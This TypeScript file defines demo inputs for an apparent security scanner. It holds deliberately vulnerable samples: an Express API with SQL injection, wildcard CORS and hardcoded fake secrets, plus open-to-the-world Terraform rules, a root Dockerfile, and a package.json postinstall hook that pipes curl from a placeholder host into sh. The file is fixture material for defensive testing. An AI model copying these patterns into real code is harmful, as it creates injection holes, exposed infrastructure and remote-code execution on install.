export type DemoSample = {
  id: string;
  name: string;
  description: string;
  recommendedDepth: 'QUICK' | 'STANDARD' | 'FULL';
  focusAreas: string[];
  files: Array<{ fileName: string; fileType: string; content: string }>;
};

const fakeSecret = 'FAKE_DEMO_ONLY_NOT_A_REAL_SECRET';

export const demoSamples: DemoSample[] = [
  { id: 'vulnerable-node-api', name: 'Vulnerable Node API', description: 'Express API with fake secrets, wildcard CORS, JWT, and unsafe query patterns.', recommendedDepth: 'STANDARD', focusAreas: ['API_SECURITY', 'SECRETS'], files: [{ fileName: 'server.js', fileType: 'js', content: `const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const app = express();
const JWT_SECRET = '${fakeSecret}';
app.use(cors({ origin: '*' }));
app.get('/user', (req, res) => db.query('SELECT * FROM users WHERE id = ' + req.query.id));
console.log('password=' + process.env.DB_PASSWORD);
app.listen(3000);` }] },
  { id: 'insecure-terraform', name: 'Insecure Terraform', description: 'Terraform with public S3 and broadly open security group examples.', recommendedDepth: 'FULL', focusAreas: ['CLOUD_IAC'], files: [{ fileName: 'main.tf', fileType: 'tf', content: `resource "aws_s3_bucket_acl" "demo" { acl = "public-read" }
resource "aws_security_group_rule" "ssh" { type = "ingress" from_port = 22 to_port = 22 cidr_blocks = ["0.0.0.0/0"] }
resource "aws_iam_policy" "admin" { policy = jsonencode({ Statement = [{ Action = "*", Resource = "*", Effect = "Allow" }] }) }` }] },
  { id: 'insecure-dockerfile', name: 'Insecure Dockerfile', description: 'Container image that runs as root and includes risky build patterns.', recommendedDepth: 'STANDARD', focusAreas: ['CONTAINER'], files: [{ fileName: 'Dockerfile', fileType: 'dockerfile', content: `FROM node:20
WORKDIR /app
COPY package.json .
RUN npm install
COPY . .
ENV API_TOKEN=${fakeSecret}
CMD ["npm", "start"]` }] },
  { id: 'clean-example', name: 'Clean example', description: 'Small low-risk example for demonstrating clean result states.', recommendedDepth: 'QUICK', focusAreas: ['API_SECURITY'], files: [{ fileName: 'app.js', fileType: 'js', content: `import express from 'express';
const app = express();
app.get('/health', (_req, res) => res.json({ ok: true }));
app.listen(3000);` }] },
  { id: 'full-portfolio-demo', name: 'Full portfolio demo', description: 'Multiple safe demo files covering secrets, API, JWT, Docker, cloud/IaC, and dependency-script risk.', recommendedDepth: 'FULL', focusAreas: ['SECRETS', 'API_SECURITY', 'AUTHENTICATION', 'CONTAINER', 'CLOUD_IAC', 'DEPENDENCIES'], files: [
    { fileName: 'server.js', fileType: 'js', content: `const cors = require('cors');
const jwt = require('jsonwebtoken');
const JWT_SECRET = '${fakeSecret}';
app.use(cors({ origin: '*' }));
app.get('/admin', (req, res) => db.query('SELECT * FROM users WHERE id=' + req.query.id));` },
    { fileName: 'Dockerfile', fileType: 'dockerfile', content: `FROM node:20
COPY . /app
WORKDIR /app
RUN npm install
CMD ["node", "server.js"]` },
    { fileName: 'main.tf', fileType: 'tf', content: `resource "aws_security_group_rule" "web" { cidr_blocks=["0.0.0.0/0"] from_port=0 to_port=65535 protocol="tcp" }
resource "aws_s3_bucket_acl" "public" { acl="public-read" }` },
    { fileName: 'package.json', fileType: 'json', content: `{ "scripts": { "postinstall": "curl https://example.invalid/install.sh | sh" } }` }
  ] }
];

export const getDemoSample = (id: string | null) => demoSamples.find(sample => sample.id === id) ?? demoSamples[0];
